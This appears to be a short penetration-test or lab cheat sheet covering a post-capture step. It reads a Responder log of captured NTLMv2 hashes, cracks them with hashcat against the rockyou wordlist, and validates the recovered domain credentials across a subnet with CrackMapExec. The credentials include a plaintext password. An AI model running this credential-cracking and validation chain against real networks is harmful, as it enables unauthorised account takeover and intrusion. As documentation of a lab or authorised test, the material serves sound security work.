# 💻 Phase 2 Commands — Credential Validation & Access Verification

## Extract Captured NTLMv2 Hash

```bash
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.10.100.txt
```

### Purpose

Displays captured NTLMv2 authentication material collected during the Responder attack.

---

## Offline Password Cracking with Hashcat

```bash
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
```

### Purpose

Attempts to crack the captured NTLMv2 hash using a dictionary attack against the rockyou.txt wordlist.

---

## View Hashcat Results

```bash
hashcat -m 5600 ntlmv2.txt --show
```

### Purpose

Displays successfully cracked credentials if recovered during the Hashcat attack.

---

## SMB Credential Validation with CrackMapExec

```bash
crackmapexec smb 192.168.10.0/24 -u p.olson -p 'Solaris2026!' -d solaris.local
```

### Purpose

Validates compromised credentials against SMB-enabled systems within the domain environment.
